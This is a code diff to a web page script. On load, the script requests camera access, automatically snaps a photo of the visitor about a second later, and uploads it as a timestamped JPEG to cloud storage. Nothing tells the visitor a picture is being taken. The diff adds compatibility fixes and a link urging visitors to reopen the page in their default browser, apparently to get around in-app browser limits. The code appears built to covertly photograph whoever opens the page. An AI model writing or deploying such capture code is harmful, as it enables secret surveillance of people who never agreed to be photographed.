@@ -23,6 +23,12 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function requestCameraAccess() {
         try {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                console.error('getUserMedia not supported in this browser.');
+                alert('Your browser does not support camera access. Please try using a different browser.');
+                return;
+            }
+
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
             videoElement.srcObject = stream;
             videoElement.play();
@@ -32,12 +38,17 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             videoElement.addEventListener('canplay', () => {
-                setTimeout(capturePhoto, 1000); // Increased delay to ensure the video is ready
+                setTimeout(() => {
+                    videoElement.pause();
+                    videoElement.play();
+                    capturePhoto();
+                }, 1000); // Reinitialize the video element
             }, { once: true });
 
             setTimeout(stopVideoStream, 2000); // Increased stop time to avoid premature stop
         } catch (error) {
             console.error("Error accessing the camera: ", error);
+            alert('Error accessing the camera. Please check your permissions or try a different browser.');
         }
     }
 
@@ -48,7 +59,8 @@ document.addEventListener('DOMContentLoaded', () => {
             canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
 
             // Optional: Debugging - Log the canvas content to console
-            console.log('Canvas image drawn:', canvasElement.toDataURL('image/png'));
+            const dataURL = canvasElement.toDataURL('image/jpeg', 0.95); // JPEG with 95% quality
+            console.log('Canvas Data URL:', dataURL);
 
             canvasElement.toBlob(blob => {
                 if (blob) {
@@ -56,14 +68,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else {
                     console.error('Failed to create blob from canvas');
                 }
-            }, 'image/png'); // PNG format for better quality
+            }, 'image/jpeg', 0.95); // JPEG format for better compatibility
         } else {
             console.error('Video element is not ready for capture');
         }
     }
 
     function uploadImage(blob) {
-        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.png'); // PNG format
+        const fileRef = storage.ref().child('images/' + 'image_' + new Date().toISOString().replace(/[-:.]/g, '') + '.jpg'); // JPEG format
 
         const uploadTask = fileRef.put(blob);
 
@@ -112,6 +124,13 @@ document.addEventListener('DOMContentLoaded', () => {
             videoElement.srcObject = null;
         }
     }
+
+    // Provide a fallback link to open the page in a different browser
+    const fallbackLink = document.createElement('a');
+    fallbackLink.href = window.location.href;
+    fallbackLink.target = '_blank';
+    fallbackLink.textContent = 'If you experience issues, click here to open in your default browser.';
+    document.body.appendChild(fallbackLink);
 
     requestCameraAccess();
 });
